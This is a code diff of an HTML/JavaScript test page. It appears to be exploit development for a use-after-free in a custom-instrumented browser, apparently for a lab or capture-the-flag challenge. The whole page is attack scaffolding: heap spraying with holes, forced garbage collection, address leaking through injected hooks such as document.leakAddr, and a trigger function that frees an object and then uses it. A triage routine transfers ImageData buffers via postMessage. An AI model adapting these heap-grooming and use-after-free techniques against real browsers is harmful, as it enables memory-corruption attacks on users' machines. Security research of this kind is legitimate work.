@@ -2,13 +2,13 @@
 <iframe id="frame" src=""></iframe>
 <br>
 <button onclick="query()">Query</button>
-<button onclick="alloc()">Alloc</button>
+<button onclick="alloc_uaf()">Alloc</button>
 <button onclick="gc()">gc</button>
 <button onclick="spray()">Spray</button>
 <button onclick="multiple_alloc()">Alloc multi</button>
+<button onclick="trigger()">Trigger</button>
+<button onclick="triage()">Triage</button>
 <script>
-var audioContext;
-var analyserNode;
 var barrier = [];
 var holes = [];
 
@@ -27,25 +27,44 @@ function spray() {
 	holes.push(tmp_arr);
     }
     for (let i = 0; i < tmp1.length; ++i)
-	analyserNode.angel_func(tmp1[i]);
+	document.leakAddr(tmp1[i]);
     for (let i = 0; i < tmp1.length; ++i)
 	tmp1[i] = undefined;
     gc();
     query();
 }
 
-var new_objs = [];
-function alloc() {
+var uaf_obj;
+function alloc_uaf() {
     let tmp = {a: "a", b: "b", c: "c", d: "d", e: "e"};
-    new_objs.push(tmp);
-    analyserNode.angel_func(tmp);
+    document.cloneObj(tmp);
 }
 
+function triage() {
+    let y = new ImageData(1, 0x4000);
+    document.leakAddr(y);
+    postMessage("", "*", [y.data.buffer]);
+    history.pushState(y,"");
+}
+
+function trigger() {
+    /*
+    gc();
+    let tmp = {a: "FUCK YOU", b: "b", c: "c", d: "d", e: "e"};
+    */
+    holes[0] = undefined;
+    gc();
+    setTimeout(function() {
+	alert(document.triggerUAF());
+    }, 1000);
+}
+
+var new_objs = [];
 function multiple_alloc() {
     for (let i = 0; i < 4; ++i) {
 	let tmp = {a: "a", b: "b", c: "c", d: "d", e: "e"};
 	new_objs.push(tmp);
-	analyserNode.angel_func(tmp);
+	document.leakAddr(tmp);
     }
 }
 
@@ -54,16 +73,8 @@ function gc() {
 }
 
 function query() {
-    analyserNode.evil_func();
+    document.leakState();
 }
-
-try {
-    audioContext = new AudioContext();
-} catch(e) {
-    alert('Web Audio API is not supported in this browser');
-}
-
-analyserNode = audioContext.createAnalyser();
 
 </script>
 </body>
